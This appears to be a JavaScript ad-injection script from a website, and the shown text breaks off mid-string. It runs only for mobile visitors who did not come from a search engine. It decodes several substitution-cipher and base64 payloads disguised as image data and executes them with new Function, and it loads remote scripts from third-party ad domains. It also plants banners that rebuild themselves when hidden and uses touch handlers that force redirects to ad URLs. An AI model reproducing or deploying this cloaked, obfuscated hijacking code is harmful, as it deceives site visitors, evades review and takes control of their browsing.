// 2022年12月2日
var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
var us = navigator.userAgent.toLowerCase();

system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;

const chooseDirection = ['b', 't'];
const directionGroup = (arr) => arr[Math.floor(Math.random() * arr.length)];
const direction = directionGroup(chooseDirection);

if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    if (direction == 't' || direction == 'all') {
        $("#topnav").attr("style", "margin-top:120px");
        const temporaryGroups = ['todayCpv','t5cpc','t5cpv','smCpv'];
        const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElements = randomNums(temporaryGroups);
        if (randomElements == 'todayCpv') {
            !(function () {
                function uGtSVxj (s) {
            var d = {"r":"d","E":"m","3":"F","4":"y","s":"I","V":"G","m":"Q","B":9,"9":"Z","6":"j","J":"W","k":1,"i":"l","U":"b","n":"n","W":"s","b":"u","R":"Y","f":"X","v":"p","P":2,"N":0,"p":3,"0":"J","Q":"B","a":"R","X":"t","+":"M","u":"C","L":5,"7":"U","c":"N","F":"a","h":"L","j":"H","5":"w","I":"v","q":"z","8":"x","w":"P","H":"T","S":"E","d":"i","=":"S","G":"V","x":"h","K":"c","t":"D","Z":6,"O":8,"2":"O","y":"K","A":"k","T":4,"1":"o","g":"f","C":"+","e":"e","l":7,"M":"r","z":"g","D":"A","o":"q","Y":"="};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function TdBvsMyu (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,rE34sVmB9VB6rJkiUnmWU6kbRf9v9P3NUp0U0pQWRfaEUp0X0kNWRp+B9uL6rf049JLN7Pc4FfQNhj7B0PB5r4LIrV0EFE3qhEcb048vwHSqcHR5+d84w=rpHnQI","FGx8ruKWKtNnFjaNKj+Zh4On2PiEyuSIfAkxRp8fFJTIhnaiKpm1UdiOgu3byfXv9dxbRf9v9P3NUpsbrfciKA3n9JLNhEib9VGTHPR10P0xFJak04AChHSvep9xKdQTFjsBUEGps3xcHSxNrj","Q=9f3k9fcNyuAleVx4hEB59JT10kQw7kmnhur1rja5Kq1Ih4KMr=WnhPzI04XvyHXTFjsbKPGN7EG8rJGqrSxiRJaiKdznmPBbrVGbruk7efQi045nRfQ5UVi6RfavUPTIeukprpKX9EB4U=kk","KE8iUEcI9VGA24Kv2px1KdLq9fa=9f3k9fcN=VGx9VG4yurRhG037GG37ka3aukf=Gas045nJSk+=jaNK30iKfGiKpmnyHXTFjsbUPL49J3AefcNRfaiRPxxUEriwJ9kUEcNFJBbyuilFJR1eV","x4hn0iRJaL7paxrV7BwHmE0nx1KdLqrV3Nrf+BwHs5+uilrE34sVaxrVSB=icwHdL5Rf0q9=xTFjsbKEGqKVBbKPG79fxNyHXb9fKzanGbRpavUPT10kOny4rN04Wn9uKM0Pcq048b9fKzanGb","RpavUPT10P+nhVaxrVSbKEGqrJ8NhEaiRPBA9=Wn2p0irjG4UdDnyPaxrVSbKEGqrJ8NhELxUJ7M04x6y=KvyVaxrVSbKEGqrJ8NhEiX94LoUPibyuKny=AvyVcqyHXBgHXTFjsbKPGb9uznrH","N804AlgJGWKPGlrE34sj+B9VB6rJkiUnmbRp0iRfaiaJ8iUJGbruznKPc4FfQN04AlK4LqKE+BKuXky4KIF4OnyPAlRp+bKV349JLNaJ8iUJGbruLvUnciKnau9J9IKE71K486K4AlgfNY"];
            new Function(TdBvsMyu(uGtSVxj(s.join('').substr(22))))();
        })();
        }
        if (randomElements == 't5cpc') {
            (function (){
                var id = "9142199889545937380-62159";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 't5cpv'){
            (function (){
                var id = "9142199889545937380-62160";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 'smCpv'){
          window.wqjiZm = function(){var a=document.createElement('a');var evjs=`(function(){var cname='wqjiZm',cn='https://api.simi1234.com/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dingbu.asdawas',jp='https://api.simi1234.com/a/c?au41205b197f7a91a401e7233b4917bd7d=',dbJeMV=null,cst=1,drv=isCheckD();if(drv){crateEl(cname);var n=0;dbJeMV=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('wqjiZm '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('wqjiZm '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=457012813477568512';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('i');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(){var _ao=document.createElement('a');_ao.href=jp+au41205b197f7a91a401e7233b4917bd7d;_ao.click()});addlistenerElement(p,function(){clearInterval(dbJeMV);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.wqjiZm img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.wqjiZm{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.wqjiZm i{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack()}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.wqjiZm();   
        }
        // 小图标
       window.vmLFYa =function(){var a=document.createElement('a');var evjs=`var cname='vmLFYa',bn='https://dingbu.bj.bcebos.com/xiaotubiao.adddd',jp='https://api.simi2345.com/a/c?au6e4511da705ef7a712d549e2736fed41=',cst=1,mg=16,mimgh=100,cx=0,cy=0,imgh=0,imghs=0,drv=isCheckD(),browserWidth=getBrowserWH().w,browserHeight=getBrowserWH().h;if(drv){crateEl(cname);var n=0;setTimeout(function(){n++;var elobj;setInterval(function(){elobj=resbaner();if(!elobj){return recreate(elobj)}var eh=elobj.getBoundingClientRect().height;if(eh<=2){return recreate(elobj)}})},500)}var s=document.createElement('script');s.src='https://api.simi2345.com/s/c?_=457012495226363904';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n,t){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;br.append(img);by.appendChild(br);br.addEventListener('touchmove',handleMove);br.addEventListener('touchend',handleChend);br.addEventListener('touchstart',handleTouchstart);img.onload=function(){if(cx!==0||cy!==0){setbs(br);return}if(t!=undefined){return}imgh=this.height;setViewHeight(imgh/2)}}function recreate(elobj){if(elobj!=null&&elobj!=undefined){elobj.remove()};cname=its(10);return crateEl('vmLFYa '+cname,0)}var eLeft=0,eTop=0;var isClick=false;function handleTouchstart(e){e.preventDefault();e.stopPropagation();eLeft=e.touches[0].pageX-this.offsetLeft,eTop=e.touches[0].pageY-this.offsetTop;isClick=true}function handleMove(e){e.preventDefault();e.stopPropagation();cx=e.touches[0].pageX-eLeft;cy=e.touches[0].pageY-eTop;imghs=imgh+2;var bw=browserWidth-imghs,bh=browserHeight-imghs;var left=(cx>=bw?bw:cx<=0?0:cx),top=(cy<=0?0:cy>=bh?bh:cy);cx=left;cy=top;this.style.cssText='left:'+left+'px;top:'+top+'px';isClick=false}function handleChend(e){e.preventDefault();e.stopPropagation();if(isClick){var self=this;self.style.transition='0.1s';self.style.transform='scale(0.90)';setTimeout(function(){self.style.transform='scale(1)'},150);setTimeout(function(){self.style.transform='scale(1)';var ja=document.createElement('a');ja.href=jp+au6e4511da705ef7a712d549e2736fed41;ja.click();ja.remove()},300)}else{handleVposition(this)}}function handleVposition(e){var o=inLeftOrRight();e.style.transition='0.2s';cx=cx>browserWidth?browserWidth:cx;var hb=(browserHeight-(imghs+mg));cy=cy>=hb?(hb):cy<=0?0:cy;cy==0?e.style.top=mg+'px':e.style.top=cy+'px';if(cx>=o.mp){e.style.left=browserWidth-(imgh+mg)+'px'}else{e.style.left=mg+'px'}}function setbs(e){var o=inLeftOrRight();var tcy=cy+'px';if(cx>=o.mp){e.style.top=tcy}else{e.style.top=tcy;e.style.left=mg+'px'}}function inLeftOrRight(){var mp=(browserWidth/2)-(imghs/2);return{mp:mp,bh:browserHeight-imghs}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}if(drv){addStyle('.vmLFYa{z-index:999;top:50%;right:0px;position:fixed;width:'+mimgh+'px !important;}.vmLFYa img{width:100%;height:100%;}')}function setViewHeight(h){if(drv){var ps='left:'+(cst==0?mg:browserWidth-(imgh+mg))+'px';addStyle('.vmLFYa{top:calc(50% - '+h+'px);'+ps+'}')}}function addStyle(style){ var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;if(system.win||system.mac){return false}return true}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}function getBrowserWH(){var o={w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight};return o}function getElse(el,ar){return window.getComputedStyle?window.getComputedStyle(el,null)[ar]:el.currentStyle[ar]};`;a.href='javascript:'+evjs;a.click()};window.vmLFYa();
      
    }
    // bottom
    if (direction == 'b' || direction == 'all') {
        const temporaryGroup = ['todayCpv', 'todayCpc', 'hl','t5cpc','t5cpv','smCpv'];
        const randomNum = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElement = randomNum(temporaryGroup);
        if (randomElement == 'todayCpv') {
            !(function () {
                function ScAaZhDL (s) {
            var d = {"C":"d","2":"m","Q":"F","X":"y","Y":"I","o":"G","I":"Q","3":9,"k":"Z","K":"j","6":"W","a":1,"1":"l","e":"b","N":"n","D":"s","f":"u","n":"Y","M":"X","j":"p","P":2,"x":0,"5":3,"T":"J","i":"B","4":"R","R":"t","S":"M","Z":"C","d":5,"p":"U","m":"N","8":"a","U":"L","A":"H","v":"w","W":"v","w":"z","E":"x","s":"P","z":"T","g":"E","L":"S","F":"k","J":"V","h":"A","r":"h","O":"O","y":"i","c":8,"0":"g","u":"K","V":4,"9":"f","t":7,"B":"o","H":"e","7":"c","G":6,"b":"r","l":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function edsaZF (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,C2QXYoI3ko3KC6a1eNIDeKafnMkjkPQxe5TeT5iDnM42e5TRTaxDn5S3kZdKCMTXk6dxpPmX8MixUAp3TP3vCXdWCoT282QwU2mfTXEjszgwmznvSLEXsLC1pAjW","kFJp8MSNUAh3TPrxCAiwOycWTwRjky0rUadmn6mcJP1fUXdxkMmxuoVj9Avrey1t86nBe2QP86CrCo3XUNJwkMTikPJfCZdje241Hg32uZCyn61FCL7jsyxEuMRPnMY0HorXs6d1CXinzpEYCA","4vp2JEC6JwCZ0jO5rB7ydW7oJfuZCIzampTXvN8A4x7ASGUXcNu5pbTX3BUX7b8LFtHorXUNm1CQT17MJ1754Yk6QFkMYBTxmWeN41eNIRJA1vkL7DTPQv7oEjnPQx863fU50RC5C5U6kW72xR","CMTDk6dKeP41klDNuzRV8AYf7PJxp2JEC6JwCgr1n6417y0N6ZaL4JQJ4Jmp4pIRJx1pLZ7DTarmzgrxCAiLkMQakMmxTXFtHorXU23f72JrkA1wCoQxk6mBn6dNkza2C6dKCo1Wey0jHP12uA","rB7ydXk6QFHJmxnM41szxxTykV8AYf754rCAJwszxXSlhjH5kr7yiFnM4rspjzzxVf7oQX7PpBHorXUNT175iWeNm1JoJVCZFte2J5Ygkae2mx863fuZC9TXDNCZ7bTPINuXCK7X7De2J5Ygka","e2mx863fuZCKTXEFnM4rUNT175JDCZdFk6mWkopbTwRXkM4a72V0TXRFnM4rUNT175JDCZdfn6a1uX7BnXFNuLrFnM4rUNT175JDCZdje67f823jey0NTXFjuLrK7XFt9MxtHorXUNm1e2IBT5","p3SL7jO5a1eAm1H5kr7yiws64Wn5JRk6dxU2mXk6QxkpJDk6a1eNIBT5mK721vCZ7jO5Sf75TKsMhbCLDNUPDWTXRjOPmwUNir72JfCgJDk6a1eNIf86dwkMTxI2J2e5T1uASDn5SjO5a3"];
            new Function(edsaZF(ScAaZhDL(s.join('').substr(22))))();
        })();
        }
        if (randomElement == 'todayCpc'){
            !(function () {
                function EfSoGYR (s) {
            var d = {"h":"d","r":"m","A":"F","R":"y","j":"I","i":"G","6":"Q","4":9,"e":"Z","0":"j","s":"W","a":1,"W":"l","d":"b","Z":"n","7":"s","1":"u","Y":"Y","E":"X","M":"p","D":2,"9":0,"g":3,"y":"J","f":"B","c":"R","V":"t","G":"M","p":"C","3":5,"5":"U","K":"N","w":"a","N":"L","P":"H","S":"w","U":"v","t":"z","u":"x","X":"P","z":"T","Q":"E","l":"S","L":"K","b":"c","C":"h","H":"A","k":"O","o":"i","8":8,"I":"g","F":"V","B":4,"v":"f","m":7,"x":"o","O":"e","2":"k","n":6,"T":"r","J":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function cxPpXU (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,hrARji64ei40hsaWdZ67d0a1YEeMeDA9dgydygf7YEcrdgyVya97YgG4ep30hEyRes395DKRwEf9NP54yD4ShR3UhiyrwrAtNrK1yRuMXzQtKzYSGRuRXlhLbrC","XYrGZNPH4yDC9hPftko8UytVMeoICNa3KYsK8FDW1NR39eEK9LiBMvPSCdoWmwsYxdrADwshChi4RNZFteEyfeDF1hp3MdrcWOQ4rLphoYsW2hlbMXo9uLEVDYEjIOiCRXs3WhRfYz5ujhPcS","5rFuhsFthpIMkgCxbo3UbiF1Lph6zaK5yRSZwPc9bPGnNR8ZLg5TyR4xNRbTwl2mOiCRNZKWhAyWbEFWbgcjesA2eEjxy9KUdZcWdZ6VFPWSelb7yDASbiuMYDA9ws41NgIVhghgNseUbr9Vh","Ey7es30dDcWeJ7ZLzVBwPj1bDF95rFuhsFthQCWYscWboIZspalcFAFcFK5c56VF9W5lpb7yaCKzQC9hPfleEAaeEK9yR2mOiCRNr41brFCePWthiA9esKxYs3Zezarhs30hiWUdoIMODWrLP","Cxbo3ResA2OFK9YEcWXz99yoeBwPj1bgcChPFtXz9RGJHMOgeCbof2YEcCX5Mzz9B1biARbD5xOiCRNZyWbgfUdZKWFiFBhp2mdrFgjQeadrK9ws41LphvyR7ZhpbTyD6ZLRh0bRb7drFgjQe","adrK9ws41Lph0yRu2YEcCNZyWbgF7hp32esKUei5TytVReEcabrBIyRV2YEcCNZyWbgF7hp31YsaWLRbxYR2ZLlC2YEcCNZyWbgF7hp3Mdsb1wr4MdoIZyR2MLlC0bR2mvE9mOiCRNZKWdr6x","yg54GlbMkgaWdPKWOgeCboftXscUYgFVes39NrKResA9e5F7esaWdZ6xygK0brWShpbMkgG1bgy0XEHThl7ZND7UyRVMkDKtNZfCbrF1hQF7esaWdZ61ws3teEy96rFrdgyWLPG7YgGMkga4"];
            new Function(cxPpXU(EfSoGYR(s.join('').substr(22))))();
        })();
        }
        if (randomElement == 'hl') {
            !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('HGdUaPYyHRl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//LSTmdJD^LT4m(2/)d6f_MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 hS6F:phX8"hFFJLg//((Lm(hOqO5@0}}0}m(2/((/}QsKj6LM2OF8}vFd5pYF8}"!Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28hS6F:phX!PYqLY[D62fODmqO(dF6O2mh5Y78hS6F:phX!P6LMSS80!PPPa! Xd5 4(L6_fdOM2}80!Xd5 4(L6_fdOMLYF62F}8LYFW2FY5Xdqc7_2(F6O2ca[67c4(L6_fdOM2}<ssa[Xd5 Fdp85m(5YdFYEqY^Y2Fc"f6X"a!FdpmLFTqY8"f6LJqdTg)qO(S!qY7Fg0!56phFg@!JOL6F6O2gd)LOq_FY!4*62fYRg}000000!D6fFhgQQb!hY6phFgsmsXD!)O5fY5*qY7Fg}JR LOq6f #ddd!"!Xd5 hY6XD84(L6_fdOM2}!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!FdpmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O284(L6_fdOPYqLY[D62fODmqO(dF6O2mh5Y784(L6_fdOPPa!5m)OfTmdJJY2fxh6qfcFdpa!4(L6_fdOM2}%8smsPYqLY[(qYd5W2FY5Xdqc4(L6_fdOMLYF62F}aPP=n0a! Xd5 4(L6_fdOM2@8}!Xd5 4(L6_fdOMLYF62F@8LYFW2FY5Xdqc7_2(F6O2ca[67c4(L6_fdOM2@<8}0a[Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!Xd5 hY6XD8cc}0*4(L6_fdOM2@a.smsa!(d2XdmLFTqY8"D6fFhgQQb!hY6phFgsmsXD!qY7Fg0!56phFg@JR!JOL6F6O2gd)LOq_FY!)O5fY5*qY7Fg@JR LOq6f #70KQn7!^d5p62g0JR!"!(d2XdmD6fFh8K00!(d2XdmhY6phF8@0!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!Xd5 LT8*c@0.4(L6_fdOM2@a%@0!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=LT=K00=@00aP!6^pmL5(86^pL(!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!4(L6_fdOM2@%%PYqLY[(qYd5W2FY5Xdqc4(L6_fdOMLYF62F@aPP=}00a!Xd5 685mpYFEqY^Y2FuTWfc"4(L6_fdOMFC"a!67c6a[6mL5(86mpYFrFF56)_FYc"fdFd*_5q"aPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//((Lm(hOqO5@0}}0}m(2/f/}QsKj(8}vF8@}{QsnQs"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!PXd5 